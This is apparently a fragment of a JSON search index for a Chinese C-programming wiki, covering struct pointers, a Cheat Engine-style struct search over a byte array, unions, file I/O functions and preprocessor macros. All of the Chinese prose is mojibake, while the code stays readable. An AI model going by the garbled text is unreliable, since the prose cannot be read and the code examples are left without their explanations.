ä¸‰&quot;&#125;,&#123;1,&quot;æå››&quot;&#125;,&#123;2,&quot;ç‹äº”&quot;&#125;&#125;; int x = arr[0].Age; è¿ç»­å­˜å‚¨"},{"title":"ç»“æ„ä½“æŒ‡é’ˆ","path":"/wiki/C/ç»“æ„ä½“æŒ‡é’ˆ.html","content":"ç»“æ„ä½“æŒ‡é’ˆ æŒ‡é’ˆçš„ç±»å‹æ˜¯ç»“æ„ä½“ï¼Œä¹Ÿæ˜¯æŒ‡é’ˆï¼Œä¹Ÿæœ‰æˆ‘ä»¬ä¹‹å‰å­¦çš„é‚£äº›æŒ‡é’ˆç‰¹å¾ï¼ˆå®½åº¦ï¼Œ++ï¼Œâ€“ï¼Œ+Nï¼Œ-Nï¼Œç›¸å‡ï¼Œå·®å€¼ï¼‰ã€‚ 123456789struct Point&#123; int a; int b;&#125;; Point x; Point *p = &amp;x; ä½¿ç”¨æŒ‡é’ˆè®¿é—®ç»“æ„ä½“æˆå‘˜ 12345678910111213141516// åˆ›å»ºç»“æ„ä½“Point p;p.x = 10;p.y = 20;// å£°æ˜ç»“æ„ä½“æŒ‡é’ˆPoint *ps;// ä¸ºç»“æ„ä½“æŒ‡é’ˆèµ‹å€¼ps = &amp;p;// é€šè¿‡æŒ‡é’ˆè¯»å–æ•°æ®printf(&quot;%d &quot;, ps-&gt;x);// é€šè¿‡æŒ‡é’ˆä¿®æ”¹æ•°æ®ps-&gt;y = 100; ç»“æ„ä½“æŒ‡é’ˆä¸€å®šè¦æŒ‡å‘ç»“æ„ä½“å—ï¼Ÿ ä»¥ä¸‹è¯´æ³•æ˜¯âŒçš„ï¼š 123456charå‹æŒ‡é’ˆï¼šæŒ‡å‘ä¸€ä¸ªcharå‹çš„æŒ‡é’ˆæ•´å‹æŒ‡é’ˆï¼šæŒ‡å‘ä¸€ä¸ªæ•´æ•°çš„æŒ‡é’ˆæŒ‡é’ˆçš„æŒ‡é’ˆï¼šæŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆ ç»“æ„ä½“æŒ‡é’ˆï¼šæŒ‡å‘ç»“æ„ä½“çš„æŒ‡é’ˆ æ•°ç»„æŒ‡é’ˆï¼šæŒ‡å‘æ•°ç»„çš„æŒ‡é’ˆ å‡½æ•°æŒ‡é’ˆï¼šæŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆ æŒ‡é’ˆçš„ç±»å‹å’Œå®ƒæŒ‡å‘ä»€ä¹ˆå˜é‡ï¼Œä¸€ç‚¹å…³ç³»éƒ½æ²¡æœ‰ã€‚ä¸è¦æŠŠæŒ‡é’ˆç±»å‹ï¼Œå’Œå®ƒæŒ‡å‘çš„å˜é‡çš„ç±»å‹ä¹‹é—´å»ºç«‹ä»»ä½•è”ç³»ã€‚ æŒ‡é’ˆçš„ç±»å‹å†³å®šäº†æŒ‡é’ˆçš„ç‰¹å¾ï¼ˆä¹‹å‰è®²çš„å®½åº¦ï¼Œ++ï¼Œâ€“ï¼Œ+Nï¼Œ-Nï¼Œç›¸å‡ï¼Œå·®å€¼é‚£äº›ï¼‰ï¼Œè‡³äºæŒ‡å‘å“ªï¼Œæ²¡æœ‰å…³è”ã€‚ ä¾‹ï¼šç»“æ„ä½“æŒ‡é’ˆæŒ‡å‘æ•°ç»„ ä¸ç”¨å…³æ³¨æŒ‡å‘çš„å˜é‡æ˜¯ä»€ä¹ˆç±»å‹ï¼Œå…³æ³¨è¿™ç§ç±»å‹çš„æŒ‡é’ˆçš„ç‰¹å¾å°±è¡Œäº†ï¼Œæ¯”å¦‚æŒ‡é’ˆ++åæ˜¯åŠ äº†å‡ ã€‚ 12345678910111213141516171819202122232425262728293031#include &quot;stdafx.h&quot;struct Point&#123; int x; int y;&#125;;int main()&#123; int arr[10] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 10&#125;; struct Point* p = (struct Point*)arr; // å¼ºè½¬ä¸ºstruct Point*ç±»å‹ for (int i = 0; i &lt; 5; i++) &#123; printf(&quot;%d %d &quot;, (p+i)-&gt;x, (p+i)-&gt;y); &#125; printf(&quot; &quot;); //////////////////////////////////// p++; //++çš„å®½åº¦æ˜¯Point*å»æ‰ä¸€ä¸ª*çš„å®½åº¦ //Pointå®½åº¦æ˜¯8å­—èŠ‚ï¼Œæ‰€ä»¥æŒ‡é’ˆ++å¢åŠ 8å­—èŠ‚ int x = p-&gt;x; //x=3 int y = p-&gt;y; //y=4 printf(&quot;%d %d &quot;, x, y); return 0;&#125; æ¨¡æ‹ŸCEæŒ‰ç»“æ„ä½“å¯¹æ•°æ®æœç´¢çš„åŠŸèƒ½ æŸ¥æ‰¾è¿™äº›æ•°æ®ä¸­ï¼Œæœ‰å‡ ä¸ªid=1 level=8çš„ç»“æ„ä½“ä¿¡æ¯ 123456//ç»“æ„ä½“å®šä¹‰typedef struct TagPlayer &#123; int id; int level;\t&#125;Player; 123456789100x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09, 0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,\t0x00,0x33,0x01,0x00,0x00,0x08,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,\t0x00,0x00,0x64,0x01,0x00,0x00,0x00,0x08,0x00,0x00, 0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00, 0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,\t0x00,0x02,0x57,0x4F,0x57,0x00,0x06,0x08,0x00,0x00, 0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00, 0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00 ç­”æ¡ˆ12345678910111213141516171819202122232425262728293031323334#include &quot;stdafx.h&quot;typedef struct TagPlayer &#123; int id; int level;&#125; Player;int main() &#123; unsigned char data[100] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x01, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x01, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x57, 0x4F, 0x57, 0x00, 0x06, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00 &#125;; //éå†æ—¶ä¸è¶…æ•°ç»„è¾¹ç•Œï¼Œæœ€åä¸€æ¬¡åœ¨dataçš„92ä½ä¸Šï¼Œåœ¨+7ä¸ªå­—èŠ‚åˆ°æœ«å°¾ç¬¬99ä¸ªã€‚ //100-sizeof(Player) + 1 for (int i = 0; i &lt; 100 - sizeof(Player) + 1; ++i) &#123; Player *p = (Player *)&amp;data[i]; if (p-&gt;id == 1 &amp;&amp; p-&gt;level == 8) &#123; printf(&quot;Found Player at address: %p, ID: %d, Level: %d &quot;, (void *)p, p-&gt;id, p-&gt;level); //åœ°å€ç”¨&amp;data[i]ä¹Ÿå¯ä»¥ //printf(&quot;Found Player at address: %p, ID: %d, Level: %d &quot;, (void *)&amp;data[i], p-&gt;id, p-&gt;level); &#125; &#125; return 0;&#125;"},{"title":"è”åˆä½“","path":"/wiki/C/è”åˆä½“.html","content":"å¼• éœ€æ±‚ï¼šæƒ³å­˜å‚¨ä¸€ä¸ªäººçš„å­¦å·å’Œèº«ä»½è¯å·ï¼Œåªè¦å­˜å‚¨å…¶ä¸­ä¸€ä¸ªå°±å¯ä»¥äº†ã€‚å­¦å·éœ€è¦ä¸€ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œèº«ä»½è¯å·éœ€è¦å››ä¸ªå­—èŠ‚ã€‚å¦‚æœç”¨ç»“æ„ä½“æ¥æ ‡è¯†ï¼š 12345struct Student&#123; char å­¦å·; int èº«ä»½è¯å·;&#125;; æ¯æ¬¡åªç”¨åˆ°ä¸€ä¸ªæˆå‘˜ï¼Œé‚£ä¹ˆå¦ä¸€ä¸ªæˆå‘˜çš„ç©ºé—´å°±ä¼šè¢«æµªè´¹ã€‚ è”åˆç»“æ„ä½“ 12345union TestUnion&#123; char x; int y;&#125;; ç‰¹ç‚¹ï¼š è”åˆä½“ä¸­çš„æˆå‘˜æ˜¯å…±äº«å†…å­˜ç©ºé—´çš„ è”åˆä½“åªæœ‰ä¸€ä¸ªæˆå‘˜å ç”¨å†…å­˜ç©ºé—´ è”åˆä½“å ç”¨çš„å†…å­˜ç©ºé—´å¤§å°æ˜¯è”åˆä½“ä¸­æœ€å®½çš„æˆå‘˜ç±»å‹ï¼Œå³max{æˆå‘˜1,æˆå‘˜2,â€¦,æˆå‘˜n} 1234567891011121314151617181920#include &quot;stdafx.h&quot;union TestUnion&#123; char x; int y;&#125;;int main()&#123; TestUnion t; printf(&quot;%d &quot;, sizeof(TestUnion)); // unionç±»å‹çš„å¤§å°æ˜¯æˆå‘˜ä¸­æœ€å®½çš„é‚£ä¸ª t.y = 0x12345678; // ç»™yèµ‹å€¼ printf(&quot;%x &quot;, t.x); // æŒ‰xçš„å®½åº¦å–æ•°æ®ï¼Œå–å‡ºæ¥æ˜¯78 printf(&quot;0x%x &quot;, t); // æŒ‰tçš„å®½åº¦å–æ•°æ®ï¼Œå–å‡ºæ¥æ˜¯12345678 printf(&quot;0x%x &quot;, t); // æŒ‰yçš„å®½åº¦å–æ•°æ®ï¼Œå–å‡ºæ¥æ˜¯12345678 return 0;&#125; æˆå‘˜å®½åº¦éƒ½ä¸€æ ·çš„è¯ï¼Œä½¿ç”¨unionçš„åŸå› å°±ä¸æ˜¯èŠ‚çœå†…å­˜ï¼Œè€Œæ˜¯ä¸ºäº†æ›´å¥½çš„å¯è¯»æ€§ 12345union TestUnion&#123; int x; int y;&#125;; ç±»å‹å’Œå˜é‡ å£°æ˜äº†ä¸€ç§è”åˆä½“ç±»å‹ï¼Œè¯¥æ•°æ®ç±»å‹çš„åå­—ä¸ºTestUnionã€‚å¯ä»¥ç”¨TestUnionæ¥å®šä¹‰unionç±»å‹ 12345union TestUnion&#123; char x; int y;&#125;; æ­£ç¡®çš„ä½¿ç”¨æ–¹æ³•1TestUnion t; é”™è¯¯çš„ä½¿ç”¨æ–¹æ³•1TestUnion.y = 0x12345678; å£°æ˜äº†ä¸€ä¸ªåŒ¿åçš„unionç±»å‹ï¼ˆåé¢æ²¡æ³•å†æ¬¡å®šä¹‰è¯¥ç±»å‹çš„å˜é‡ï¼‰ï¼Œå®šä¹‰äº†ä¸€ä¸ªå˜é‡TestUnionã€‚ 12345union &#123; char x; int y;&#125;TestUnion; æ­£ç¡®çš„ä½¿ç”¨æ–¹æ³•1TestUnion.y = 0x12345678; é”™è¯¯çš„ä½¿ç”¨æ–¹æ³•1TestUnion t;"},{"title":"éšæ‰‹è®°ä¸€äº›å‡½æ•°","path":"/wiki/C/éšæ‰‹è®°ä¸€äº›å‡½æ•°.html","content":"æ–‡ä»¶è¯»å†™ç›¸å…³å‡½æ•° fopenå‡½æ•° 1234FILE *fopen( const char *filename, const char *mode); æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿”å›æ–‡ä»¶æŒ‡é’ˆ fseekå‡½æ•° ç§»åŠ¨æ–‡ä»¶æŒ‡é’ˆåˆ°æŒ‡å®šçš„ä½ç½® 12345int fseek( FILE *stream, long offset, int origin); stream Pointer to FILE structure. offset Number of bytes from origin. origin Initial position. éœ€æ˜¯ä¸‹åˆ—å¸¸é‡ä¹‹ä¸€ï¼š origin value Meaning SEEK_CUR Current position of file pointer.å¯ä»¥å†™1 SEEK_END End of file.å¯ä»¥å†™2 SEEK_SET Beginning of file.å¯ä»¥å†™0 ftellå‡½æ•° Gets the current position of a file pointer.è¿”å›å½“å‰æ–‡ä»¶æŒ‡é’ˆçš„ä½ç½® 123long ftell( FILE *stream); fcloseå‡½æ•° Closes a stream (fclose) or closes all open streams (_fcloseall). 123int fclose( FILE *stream); freadå‡½æ•° ä»ç»™å®šçš„æµstreamä¸­è¯»å–æ•°æ®åˆ°æŒ‡å®šçš„æ•°ç»„ä¸­ 123456size_t fread( void *buffer, //æŒ‡å‘ä¸€ä¸ªå†…å­˜å—çš„æŒ‡é’ˆï¼Œè¿™ä¸ªå†…å­˜å—ç”¨äºæ¥æ”¶ä»æ–‡ä»¶ä¸­è¯»å–çš„æ•°æ® size_t size, //æ¯ä¸ªå…ƒç´ çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ size_t count, //è¦è¯»å–çš„å…ƒç´ æ•°é‡ FILE *stream //æŒ‡å‘FILEå¯¹è±¡çš„æŒ‡é’ˆï¼Œè¯¥FILEå¯¹è±¡æ ‡è¯†äº†è¦ä»ä¸­è¯»å–æ•°æ®çš„è¾“å…¥æµ); è¿”å›å€¼ï¼š freadè¿”å›æˆåŠŸè¯»å–çš„å…ƒç´ æ•°é‡ã€‚å¦‚æœè¿™ä¸ªæ•°é‡æ¯”è¯·æ±‚çš„æ•°é‡å°ï¼Œå¯èƒ½æ˜¯å› ä¸ºå‘ç”Ÿäº†é”™è¯¯æˆ–è€…åˆ°è¾¾äº†æ–‡ä»¶æœ«å°¾ã€‚ fwrite Writes data to a stream. 123456size_t fwrite( const void *buffer, size_t size, size_t count, FILE *stream); é”™è¯¯æ‰“å°å‡½æ•° å‚è€ƒï¼šC åº“å‡½æ•° - perror() C åº“å‡½æ•°void perror(const char *str)æŠŠä¸€ä¸ªæè¿°æ€§é”™è¯¯æ¶ˆæ¯è¾“å‡ºåˆ°æ ‡å‡†é”™è¯¯stderrã€‚é¦–å…ˆè¾“å‡ºå­—ç¬¦ä¸²strï¼Œåè·Ÿä¸€ä¸ªå†’å·ï¼Œç„¶åæ˜¯ä¸€ä¸ªç©ºæ ¼ã€‚ 1void perror(const char *str) 1234567891011121314151617#include &lt;stdio.h&gt;int main()&#123; const char* filepath=&quot;C:\\\\WINDOWS\\\\system32\\ otepad123.exe&quot;; //ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„ FILE* file; // æ‰“å¼€æ–‡ä»¶ file = fopen(filepath, &quot;rb&quot;); if (file == NULL) &#123; perror(&quot;Error opening file&quot;); return NULL; &#125; return 0;&#125;"},{"title":"é¢„å¤„ç†","path":"/wiki/C/é¢„å¤„ç†.html","content":"é¢„å¤„ç†ä¸€èˆ¬æ˜¯æŒ‡åœ¨ç¨‹åºæºä»£ç è¢«è½¬æ¢ä¸ºäºŒè¿›åˆ¶ä»£ç ä¹‹å‰ï¼Œç”±é¢„å¤„ç†å™¨å¯¹ç¨‹åºæºä»£ç æ–‡æœ¬è¿›è¡Œå¤„ç†ï¼Œå¤„ç†åçš„ç»“æœå†ç”±ç¼–è¯‘å™¨è¿›ä¸€æ­¥ç¼–è¯‘ã€‚ é¢„å¤„ç†ä¸»è¦åŒ…æ‹¬å®å®šä¹‰ã€æ–‡ä»¶åŒ…å«ã€æ¡ä»¶ç¼–è¯‘ä¸‰éƒ¨åˆ†ã€‚ å®å®šä¹‰ ç®€å•çš„å®ï¼š#define æ ‡è¯†ç¬¦ å­—ç¬¦åºåˆ— 1234#define FALSE 0#define NAME &quot;LUODAOYI&quot;#define __IN#define __OUT å®åªæ˜¯åšä¸€ä¸ªç®€å•çš„å­—ç¬¦æ›¿æ¢ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼Œå¯ä»¥å°†methodä¸­å„ä¸ªå­—ç¬¦ç”¨å®æ¥è¡¨ç¤ºï¼Œç¼–è¯‘æ˜¯å¯ä»¥é€šè¿‡çš„ã€‚ æ­£å¸¸å†™çš„å‡½æ•°ç”¨å®æ›¿æ¢1234567891011121314151617#include &quot;stdafx.h&quot;#include &lt;string.h&gt; #define NAME &quot;ABCD&quot;int method() &#123; char buffer[0x10]; strcpy(buffer,NAME); return 0;&#125;int main()&#123; method(); return 0;&#125;1234567891011121314151617181920#include &quot;stdafx.h&quot;#include &lt;string.h&gt; #define NAME &quot;ABCD&quot;#define A int method() &#123;#define B char buffer[0x10];#define C strcpy(buffer,NAME);#define D return 0;&#125;#define E method();ABCDint main()&#123; E return 0;&#125; å¸¦å‚æ•°çš„å®ï¼š#define æ ‡è¯†ç¬¦(å‚æ•°è¡¨) å­—ç¬¦åºåˆ— 123#define MAX(A,B) ((A)&gt;(B)?(A):(B)) x = MAX(p, q); // å°†è¢«æ›¿æ¢æˆy=((p) &gt; (q)?(p):(q) å¤šè¡Œå£°æ˜ï¼š defineå¯ä»¥æ›¿ä»£å¤šè¡Œçš„ä»£ç ï¼Œè®°å¾—åé¢åŠ  \\ æ­£å¸¸å†™çš„å‡½æ•°ç”¨å®æ›¿æ¢123456789101112131415161718#include &quot;stdafx.h&quot;int method(int arr[], int length)&#123; for (int i = 0; i &lt; length; i++) &#123; printf(&quot;%d &quot;, arr[i]); &#125; return 0;&#125;int main()&#123; int arr[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 0&#125;; method(arr, 10); return 0;&#125;123456789101112131415161718192021222324252627#include &quot;stdafx.h&quot;//å•è¡Œå£°æ˜//#define MYPRINT(X,Y) for(int i=0;i&lt;(Y);i++)&#123;printf(&quot;%d &quot;,(X)[i]);&#125;//å¤šè¡Œå£°æ˜//å‰é¢çš„tabã€ç©ºæ ¼æ— æ‰€è°“#define MYPRINT(X,Y) for(int i=0;i&lt;(Y);i++)\\ &#123;\\ printf(&quot;%d &quot;,(X)[i]);\\ &#125;\\//ä¸‹é¢è¿™æ ·ä¹Ÿè¡Œ/*#define MYPRINT(X,Y) for(int i=0;i&lt;(Y);i++)\\&#123;\\ printf(&quot;%d &quot;,(X)[i]);\\&#125;\\*/int main()&#123; int arr[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 0&#125;; MYPRINT(arr, 10) return 0;&#125; å®VSæ™®é€šå‡½æ•° æŸ¥çœ‹è¿™æ®µä»£ç çš„åæ±‡ç¼– 1234567891011121314#include &quot;stdafx.h&quot;#define MYPRINT(X,Y) for(int i=0;i&lt;(Y);i++)\\ &#123;\\ printf(&quot;%d &quot;,(X)[i]);\\ &#125;\\int main()&#123; int arr[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 0&#125;; MYPRINT(arr, 10) return 0;&#125; å‘ç°å®æ˜¯ç›´æ¥å°†å­—ç¬¦åºåˆ—ç›´æ¥è´´åˆ°ä½¿ç”¨å®çš„åœ°æ–¹ï¼Œå³å†…è”åˆ°ä»£ç å†… å®ä¸å‡½æ•°çš„åŒºåˆ«ï¼šå‡½æ•°è°ƒç”¨è¦åˆ†é…æ–°çš„å †æ ˆç©ºé—´ï¼Œè€Œå®åªæ˜¯æ›¿æ¢ ä¼˜ç‚¹ ç¼ºç‚¹ å® ç›´æ¥å†…è”åˆ°ä»£ç ä¸­ï¼ŒèŠ‚çœå †æ ˆç©ºé—´ï¼Œæ— æ ˆå¸§åˆ‡æ¢çš„åŠ¨ä½œ å½“ä»£ç ä¸­å¤§é‡ä½¿ç”¨åŒä¸€ä¸ªå®æ—¶ï¼Œè¿™ä¸ªå®ä¼šè¢«å¤åˆ¶å¤šä»½ï¼Œå¯¼è‡´ç¼–è¯‘å‡ºçš„exeè‡ƒè‚¿ å‡½æ•° è°ƒç”¨å‡½æ•°æ—¶å‹å‚æ•°ï¼Œcallå‡½æ•°ï¼Œä¸ä¼šåƒå®é‚£æ ·å¤åˆ¶å¤šä»½ éœ€è¦æ ˆå¸§åˆ‡æ¢ ç”¨å®æˆ–å‡½æ•°ï¼Ÿé€»è¾‘çŸ­ã€å¾ˆç®€å•çš„å¯ä»¥ç”¨å®ï¼›é€»è¾‘å¤æ‚çš„ç”¨å‡½æ•° æ³¨æ„äº‹é¡¹ å®åœ¨ç¼–è¯‘å‰å¤„ç†ï¼Œåªåšå­—ç¬¦åºåˆ—çš„æ›¿æ¢å·¥ä½œï¼Œä¸åšä»»ä½•è¯­æ³•æ£€æµ‹ï¼›å¦‚æœå®å®šä¹‰ä¸å½“ï¼Œé”™è¯¯è¦åˆ°é¢„å¤„ç†ä¹‹åçš„ç¼–è¯‘é˜¶æ®µæ‰èƒ½å‘ç° å®åæ ‡è¯†ç¬¦ä¸å·¦åœ†æ‹¬å·ä¹‹å‰ä¸å…è®¸æœ‰ç©ºç™½ç¬¦ï¼Œåº”ç´§æ¥åœ¨ä¸€èµ· ä¸ºäº†é¿å…å‡ºé”™ï¼Œå®å®šä¹‰ä¸­ç»™å½¢å‚åŠ ä¸Šæ‹¬å· å¤šè¡Œå£°æ˜æ—¶ï¼Œå›è½¦æ¢è¡Œå‰è¦åŠ ä¸Šå­—ç¬¦'\\[enter]'ï¼Œæ³¨æ„å­—ç¬¦'\\'åè¦ç´§è·Ÿå›è½¦é”®ï¼Œä¸èƒ½è·Ÿç©ºæ ¼æˆ–å…¶ä»–å­—ç¬¦ï¼Œè¦ä¸ç¼–è¯‘æŠ¥é”™ å®çš„æœ«å°¾ä¸éœ€è¦åˆ†å·ï¼Œè¦ä¸æ›¿æ¢æ—¶ä¼šå°†åˆ†å·å¸¦ä¸Šå»æ›¿æ¢ï¼Œå¯¼è‡´ç¼–è¯‘å¯èƒ½æŠ¥é”™ æ¡ä»¶ç¼–è¯‘ æ¡ä»¶ç¼–è¯‘èƒ½æ§åˆ¶æŸæ®µä»£ç æœ€ç»ˆç¼–ä¸ç¼–è¯‘ï¼Œç”Ÿä¸ç”Ÿæˆæ±‡ç¼–ä»£ç  12345678910111213#include &quot;stdafx.h&quot;int main()&#123;#if 0 //è¡¨è¾¾å¼ä¸æˆç«‹ï¼Œé¢„å¤„ç†æ—¶åˆ æ‰è¿™æ®µä»£ç  printf(&quot;--------&quot;)#endif#if 1 //è¡¨è¾¾ä¸æˆç«‹ï¼Œé¢„å¤„ç†æ—¶ä¿ç•™è¿™æ®µä»£ç ï¼Œæœ€ç»ˆä¼šç¼–è¯‘ printf(&quot;********&quot;)#endif return 0;&#125; å¸¸è§åœºæ™¯ï¼Œè°ƒè¯•æ—¶å¢åŠ ä¸€äº›è°ƒè¯•çš„æ‰“å°è¾“å‡ºï¼Œè°ƒå¥½äº†åœ¨å°†å®å®šä¹‰ä¸º0ã€‚ è°ƒè¯•æ—¶å‘å¸ƒæ—¶1234567891011#include &quot;stdafx.h&quot;#define DEBUG 1 int main()&#123;#if DEBUG printf(&quot;**ä¸€äº›è°ƒè¯•ä¿¡æ¯**&quot;)#endif return 0;&#125;1234567891011#include &quot;stdafx.h&quot;#define DEBUG 0 int main()&#123;#if DEBUG printf(&quot;**ä¸€äº›è°ƒè¯•ä¿¡æ¯**&quot;);#endif return 0;&#125; é¢„å¤„ç†å™¨åœ¨é¢„å¤„ç†æ­¥éª¤æ—¶ï¼Œä¼šåˆ¤æ–­æ¡ä»¶ç¼–è¯‘å€¼çš„çœŸå‡ å¦‚æœä¸ºçœŸï¼Œåˆ™ä¿ç•™è¿™æ®µä»£ç ï¼Œåç»­ç¼–è¯‘æ­¥éª¤å°±ä¼šç¼–è¯‘è¿™æ®µä»£ç  å¦‚æœä¸ºå‡ï¼Œåˆ æ‰è¿™æ®µä»£ç ï¼Œåç»­ç¼–è¯‘æ­¥éª¤å°±ä¸ä¼šç¼–è¯‘è¿™æ®µä»£ç  é¢„å¤„ç†æŒ‡ä»¤ï¼šæ¡ä»¶ç¼–è¯‘æ˜¯é€šè¿‡é¢„å¤„ç†æŒ‡ä»¤å®ç°çš„ æŒ‡ä»¤ ç”¨é€” #define å®šä¹‰å® #undef å–æ¶ˆå·²å®šä¹‰çš„å® 123456/*å‡è®¾è¿™é‡Œå®šä¹‰äº†DEBUGçš„å€¼*/#undef DEBUG //å–æ¶ˆä¹‹å‰DEBUGçš„å®šä¹‰#define DEBUG 1 //å®šä¹‰DEBUG æŒ‡ä»¤ ç”¨é€” #if å¦‚æœç»™å®šæ¡ä»¶ä¸ºçœŸï¼Œåˆ™ç¼–è¯‘ä¸‹é¢ä»£ç  #endif ç»“æŸä¸€ä¸ª#ifâ€¦#elseæ¡ä»¶ç¼–è¯‘å— #else åŒelse æŒ‡ä»¤ ç”¨é€” #ifdef å¦‚æœå®å·²ç»å®šä¹‰ï¼Œåˆ™ç¼–è¯‘ä¸‹é¢ä»£ç  #ifndef å¦‚æœå®æ²¡æœ‰å®šä¹‰ï¼Œåˆ™ç¼–è¯‘ä¸‹é¢ä»£ç  å†™æ³•ä¸€å†™æ³•äºŒ1234567891011121314151617#include &quot;stdafx.h&quot;#define A int main()&#123;#if defined A //å¦‚æœå®šä¹‰äº†Aï¼Œåˆ™printf 1ç¼–è¯‘ printf(&quot;-----------1 &quot;);#elif defined B printf(&quot;-----------2 &quot;);#elif defined C printf(&quot;-----------3 &quot;);#endif return 0;&#125;12345678910111213141516171819#include &quot;stdafx.h&quot;#define A int main()&#123;//ç­‰ä»·å†™æ³•//#ifdef A#if defined A //å¦‚æœå®šä¹‰äº†Aï¼Œåˆ™printf 1ç¼–è¯‘ printf(&quot;-----------1 &quot;);#elif defined B printf(&quot;-----------2 &quot;);#elif defined C printf(&quot;-----------3 &quot;);#endif return 0;&#125; ä¾‹å­ 1234567891011#undef TRUE //å–æ¶ˆTRUEå®šä¹‰#define TRUE 1 //å®šä¹‰TRUE#if defined a //å¦‚æœaå®šä¹‰äº†#undef a //è§£é™¤açš„å®šä¹‰//define a 200 //é‡æ–°å®šä¹‰a#endif //ç»“æŸ#if#ifndef a //å¦‚æœaæ²¡æœ‰å®šä¹‰#define a 100 //å®šä¹‰a#endif //ç»“æŸ#if æ–‡ä»¶åŒ…å« æŒ‡ä»¤ ç”¨é€” #include åŒ…å«æ–‡ä»¶ æ–‡ä»¶åŒ…å«æœ‰ä¸¤ç§æ ¼å¼ï¼Œåˆ†åˆ«æ˜¯#include &quot;file&quot;å’Œ#include &lt;file&gt; ä½¿ç”¨åŒå¼•å·ï¼šç³»ç»Ÿé¦–å…ˆåˆ°å½“å‰ç›®å½•ä¸‹æŸ¥æ‰¾ï¼Œå¦‚æœæ²¡æ‰¾åˆ°ï¼Œå†åˆ°ç³»ç»ŸæŒ‡å®šçš„åŒ…å«æ–‡ä»¶ç›®å½•(ç”±ç”¨æˆ·åœ¨é…ç½®ç¯å¢ƒæ—¶è®¾ç½®)å»æ‰¾ ä½¿ç”¨å°–æ‹¬å·ï¼šç›´æ¥åˆ°ç³»ç»ŸæŒ‡å®šçš„åŒ…å«æ–‡ä»¶ç›®å½•å»æŸ¥æ‰¾ æ‰€ä»¥ç³»ç»Ÿæ–‡ä»¶ç”¨&lt;&gt;å°–æ‹¬å·ï¼Œè‡ªå·±å®šä¹‰çš„æ–‡ä»¶ç”¨&quot;&quot;åŒå¼•å·ã€‚ å¤šæ–‡ä»¶ç¼–ç¨‹ è‰¯å¥½çš„ä¹ æƒ¯ï¼šå‡½æ•°çš„å£°æ˜æ”¾åœ¨a.hå¤´æ–‡ä»¶ä¸­ï¼Œå®ç°æ”¾åœ¨a.cppä¸­ï¼ˆæ–‡ä»¶åéšæ„ï¼Œ.hå’Œ.cppè¦é…å¥—çš„ï¼‰ max.h1int max(int x, int y); max.cpp1234int max(int x, int y)&#123; return x &gt; y ? x : y;&#125; main.cpp12345678#include &lt;stdio.h&gt;#include &quot;max.h&quot;int main()&#123;\tint r=max(1,2);\treturn 0;&#125; é€šè¿‡VC6è‡ªåŠ¨ç”Ÿæˆé…å¯¹çš„.hå’Œ.cppæ–‡ä»¶VC6ï¼Œåœ¨ClassViewï¼Œå³é”®ï¼ŒNew Classï¼Œå¯ä»¥è®©ç¼–è¯‘å™¨åˆ›å»ºä¸€å¯¹æ–‡ä»¶ï¼ˆ.hå’Œ.cppï¼‰d.hd.cpp1234567891011121314151617181920// d.h: interface for the d class.////////////////////////////////////////////////////////////////////////#if !defined(AFX_D_H__DCF3E4B9_36E9_4116_B0CC_6F3EB90C9D67__INCLUDED_)#define AFX_D_H__DCF3E4B9_36E9_4116_B0CC_6F3EB90C9D67__INCLUDED_#if _MSC_VER &gt; 1000#pragma once#endif // _MSC_VER &gt; 1000class d &#123;public:\td();\tvirtual ~d();&#125;;#endif // !defined(AFX_D_H__DCF3E4B9_36E9_4116_B0CC_6F3EB90C9D67__INCLUDED_)æ¡ä»¶ç¼–è¯‘ï¼Œç¡®ä¿å¤¹åœ¨ä¸­é—´çš„ä»£ç åªä¼šç¼–è¯‘ä¸€æ¬¡1234#if !defined(AFX_D_H__DCF3E4B9_36E9_4116_B0CC_6F3EB90C9D67__INCLUDED_)#define AFX_D_H__DCF3E4B9_36E9_4116_B0CC_6F3EB90C9D67__INCLUDED_#endif // !defined(AFX_D_H__DCF3E4B9_36E9_4116_B0CC_6F3EB90C9D67__INCLUDED_)#pragma 